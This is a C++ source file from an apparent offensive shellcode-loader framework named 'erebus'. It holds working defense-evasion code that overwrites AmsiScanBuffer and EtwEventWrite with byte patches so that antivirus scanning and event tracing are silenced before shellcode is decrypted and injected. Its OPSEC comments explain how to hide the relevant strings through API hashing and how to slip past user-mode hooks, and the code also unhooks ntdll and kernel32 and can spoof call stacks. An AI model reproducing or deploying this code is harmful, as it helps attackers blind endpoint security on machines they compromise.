/**
 * @file evasion.cpp
 * @brief AMSI and ETW runtime patching
 *
 * Patches AmsiScanBuffer and EtwEventWrite at runtime to suppress security
 * telemetry before shellcode decryption and injection.
 *
 * OPSEC notes:
 *   - Module and function names are resolved via API hashing (ImportModule /
 *     ImportFunction are hashed through H() in loader.hpp), so no plaintext
 *     "amsi.dll" / "AmsiScanBuffer" / "EtwEventWrite" strings reach .rdata.
 *   - Protection flips go through NtProtectVirtualMemory rather than
 *     VirtualProtect, which keeps the patch operation off the most common
 *     user-mode hook surface.
 *   - AMSI is resolved via PEB walk first; the loader only falls back to
 *     LoadLibraryC (LdrLoadDll) when the host process has not already mapped
 *     amsi.dll.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion_utils.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#include "../../include/evasion/amsi_bypass.hpp"
#include "../../include/evasion/etw_bypass.hpp"
#include "../../include/evasion/unhook_extended.hpp"
#if CONFIG_CALLSTACK_SPOOF_ENABLED
#include "../../include/evasion/callstack_spoof.hpp"
#endif

namespace erebus {
namespace evasion {

    // FlipProtection is defined in evasion_utils.hpp (included via loader.hpp).

    // ----------------------------------------------------------------
    // AMSI bypass - patch AmsiScanBuffer
    // ----------------------------------------------------------------

    BOOL PatchAmsi()
    {
        // Try PEB-walk first; only fall back to LdrLoadDll if AMSI is not
        // already mapped into the host. The common .NET-host case never
        // touches a loader API.
        HMODULE hAmsi = ImportModule("amsi.dll");
        if (!hAmsi)
        {
            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
            if (!hAmsi)
            {
                LOG_INFO("amsi.dll not loaded, skipping AMSI patch");
                return TRUE;
            }
        }

        typedef LONG (WINAPI *typeAmsiScanBuffer)(
            HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PVOID);
        ImportFunction(hAmsi, AmsiScanBuffer, typeAmsiScanBuffer);
        if (!AmsiScanBuffer)
        {
            LOG_ERROR("Failed to resolve AmsiScanBuffer");
            return FALSE;
        }

        // x64 patch: mov eax, 0x80070057; ret  (6 bytes)
        // x86 patch: mov eax, 0x80070057; ret 0x18  (8 bytes)
#ifdef _WIN64
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC3                            // ret
        };
#else
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC2, 0x18, 0x00               // ret 0x18
        };
#endif

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on AmsiScanBuffer");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)AmsiScanBuffer, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("AMSI patched (AmsiScanBuffer -> E_INVALIDARG)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // ETW bypass - patch EtwEventWrite
    // ----------------------------------------------------------------

    BOOL PatchEtw()
    {
        HMODULE hNtdll = ImportModule("ntdll.dll");
        if (!hNtdll)
        {
            LOG_ERROR("Failed to get ntdll.dll for ETW patch");
            return FALSE;
        }

        typedef ULONG (WINAPI *typeEtwEventWrite)(
            ULONGLONG RegHandle, PVOID EventDescriptor, ULONG UserDataCount, PVOID UserData);
        ImportFunction(hNtdll, EtwEventWrite, typeEtwEventWrite);
        if (!EtwEventWrite)
        {
            LOG_ERROR("Failed to resolve EtwEventWrite");
            return FALSE;
        }

        // xor eax, eax; ret  (3 bytes) - returns STATUS_SUCCESS
        BYTE patch[] = {
            0x33, 0xC0,  // xor eax, eax
            0xC3         // ret
        };

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on EtwEventWrite");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)EtwEventWrite, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("ETW patched (EtwEventWrite -> nop)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // Combined entry point
    // ----------------------------------------------------------------

    BOOL RunEvasionPatches()
    {
        // -----------------------------------------------------------------
        // Unhook - scope controlled by CONFIG_UNHOOK_SCOPE.
        // Unhooking runs first so all subsequent patches and syscalls reach
        // clean stubs. Failures are non-fatal; downstream evasion still has
        // a chance through whatever hook may remain.
        // -----------------------------------------------------------------

        // CONFIG_UNHOOK_SCOPE 0: ntdll only (always runs when scope >= 0,
        // which is every valid value).
#if CONFIG_UNHOOK_SCOPE >= 0
        UnhookNtdll();
#endif
        // CONFIG_UNHOOK_SCOPE 1: also unhook kernel32 and KernelBase.
#if CONFIG_UNHOOK_SCOPE >= 1
        UnhookKernel32();
        UnhookKernelbase();
#endif
        // CONFIG_UNHOOK_SCOPE 2: selective per-function prologue restore.
        // Default list covers the Nt* functions used by the injection path.
#if CONFIG_UNHOOK_SCOPE == 2
        static const ULONG kSelectiveHashes[] = {
            erebus::HashStringFowlerNollVoVariant1a("NtAllocateVirtualMemory"),
            erebus::HashStringFowlerNollVoVariant1a("NtWriteVirtualMemory"),
            erebus::HashStringFowlerNollVoVariant1a("NtProtectVirtualMemory"),
            erebus::HashStringFowlerNollVoVariant1a("NtCreateSection"),
            erebus::HashStringFowlerNollVoVariant1a("NtMapViewOfSection"),
            erebus::HashStringFowlerNollVoVariant1a("NtOpenSection"),
        };
        UnhookSelective(kSelectiveHashes, sizeof(kSelectiveHashes) / sizeof(kSelectiveHashes[0]));
#endif

        // -----------------------------------------------------------------
        // Callstack spoofing init (optional compile-time feature).
        // -----------------------------------------------------------------
#if CONFIG_CALLSTACK_SPOOF_ENABLED
        InitCallstackSpoof();
#endif

        // -----------------------------------------------------------------
        // AMSI - tiered bypass controlled by CONFIG_AMSI_BYPASS_TYPE.
        // -----------------------------------------------------------------
#if CONFIG_AMSI_BYPASS_TYPE >= 1
        PatchAmsi();            // existing - patches AmsiScanBuffer
#endif
#if CONFIG_AMSI_BYPASS_TYPE >= 2
        PatchAmsiOpenSession();
#endif
#if CONFIG_AMSI_BYPASS_TYPE >= 3
        InvalidateAmsiContext();
#endif

        // -----------------------------------------------------------------
        // ETW - tiered bypass controlled by CONFIG_ETW_BYPASS_TYPE.
        // -----------------------------------------------------------------
#if CONFIG_ETW_BYPASS_TYPE >= 1
        PatchEtw();             // existing - patches EtwEventWrite
#endif
#if CONFIG_ETW_BYPASS_TYPE >= 2
        PatchEtwEventWriteFull();
#endif
#if CONFIG_ETW_BYPASS_TYPE >= 3
        UnregisterEtwProviders();
#endif

        // Partial success is acceptable - AMSI may not be loaded in
        // non-.NET host processes; ETW patch is always available.
        return TRUE;
    }

} // namespace evasion
} // namespace erebus
